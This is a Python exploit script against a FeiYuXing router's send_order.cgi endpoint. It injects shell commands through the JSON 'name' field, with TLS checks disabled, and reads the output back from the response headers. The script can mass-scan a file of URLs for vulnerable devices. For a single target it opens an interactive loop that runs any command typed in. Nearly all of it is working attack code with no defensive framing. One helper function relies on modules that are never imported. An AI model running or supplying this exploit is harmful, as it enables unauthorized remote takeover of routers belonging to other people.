import requests
import urllib3
import re
from urllib.parse import urljoin,quote
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/send_order.cgi?parameter=operation")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """{"opid":"1","name":";echo 123:Helloworld;","type":"rest"}"""
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        response_result = str(response.headers)
        if response.status_code == 200 and 'Helloworld' in response_result:
                print(f"\033[31mDiscovered:{url}: FeiYuXingRouter_send_order_RCE!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/send_order.cgi?parameter=operation")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                data = """{"opid":"1","name":";echo -n 123:;%s;","type":"rest"}"""%(command)
                try:
                    response_sult = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
                    if response_sult.status_code == 200:
                        response_sult = str(response_sult.headers)
                        print(response_sult)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")